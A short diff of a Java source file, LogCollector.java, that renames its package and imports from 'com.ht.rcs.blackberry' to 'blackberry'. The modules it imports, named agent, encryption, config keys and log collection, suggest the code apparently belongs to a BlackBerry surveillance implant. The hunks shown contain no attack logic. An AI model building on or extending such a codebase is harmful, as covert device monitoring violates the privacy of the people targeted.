@@ -5,7 +5,7 @@
  * File         : LogCollector.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.log;
+package blackberry.log;
 
 import java.io.IOException;
 import java.util.Date;
@@ -19,15 +19,15 @@ import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
 import net.rim.device.api.util.NumberUtilities;
 
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.config.Keys;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.fs.AutoFlashFile;
-import com.ht.rcs.blackberry.fs.Path;
-import com.ht.rcs.blackberry.interfaces.Singleton;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.agent.Agent;
+import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
+import blackberry.interfaces.Singleton;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class LogCollector implements Singleton {
 	//#debug
